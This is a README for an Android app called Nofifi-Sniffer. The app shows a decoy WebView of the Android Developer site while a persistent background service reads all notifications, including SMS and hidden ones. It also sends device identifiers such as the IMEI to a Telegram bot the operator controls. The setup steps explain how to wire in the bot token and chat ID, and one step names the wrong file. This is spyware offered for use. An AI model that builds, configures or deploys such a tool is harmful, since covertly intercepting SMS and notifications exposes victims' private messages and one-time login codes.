# 🚀 Nofifi-Sniffer  

A powerful Android app that **loads a WebView, monitors notifications, and sends device details to a Telegram bot**.  

---

## 🔹 Features  

✅ **WebView Loader** → Displays the [Android Developer website](https://developer.android.com/studio) inside a WebView.  

✅ **Notification Listener** → Reads all notifications, including SMS and hidden notifications.  

✅ **Background Service** → Runs persistently to monitor notifications.  

✅ **Device Information Retrieval** → Sends details (**Manufacturer, Model, Android Version, Android ID, IMEI**) to Telegram.  

---

## 🛠️ Setup Guide  

### **1️⃣ Step 1: Configure Telegram Bot**  

🔹 **Create a bot** on [@BotFather](https://t.me/BotFather) and get the **BOT_TOKEN**.  

🔹 **Find your user ID** using [@userinfobot](https://t.me/userinfobot) and get your **CHAT_ID**.  

---

### **2️⃣ Step 2: Edit `MainActivity.java`**  

🔹 Open `MainActivity.java` and update the following variables with your credentials:  

```java
// Replace with your Telegram bot token
private static final String BOT_TOKEN = "";

// Replace with your Telegram user ID
private static final String CHAT_ID = "";
```
### **2️⃣ Step 3: Edit `MyNotificationListener.java`**  

🔹 Open `MainActivity.java` and update the following variables with your credentials:  

```java
// Replace with your Telegram bot token
private static final String BOT_TOKEN = "";

// Replace with your Telegram user ID
private static final String CHAT_ID = "";
```

6️⃣ Step 4: Run the App
🔹 Launch the app → It will load the WebView and request permissions.

🔹 The background service will start and send device details to your Telegram bot.

